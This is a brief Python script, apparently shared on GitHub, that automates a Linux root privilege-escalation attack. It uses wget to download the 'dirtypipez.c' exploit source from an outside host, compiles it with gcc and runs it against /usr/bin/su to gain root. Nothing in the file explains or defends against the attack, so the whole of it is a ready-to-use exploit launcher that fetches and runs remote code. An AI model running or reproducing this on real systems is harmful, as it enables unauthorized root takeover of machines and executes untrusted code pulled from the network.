'''
Author: www.github.com/JuanBindez
Description: 
Python Version: 3.10
year: 2022
Local: Brazil
'''

import os
import time


def down_pipez():
    os.system("wget https://haxx.in/files/dirtypipez.c")
    time.sleep(2)
    
def compi_pipez():
    os.system("gcc dirtypipez.c -o dirtypipez")
    print("ok compilado!!!")

def root():
    os.system("./dirtypipez /usr/bin/su")
    
#execution of program
down_pipez()
time.sleep(2)
compi_pipez()
time.sleep(2)
root()
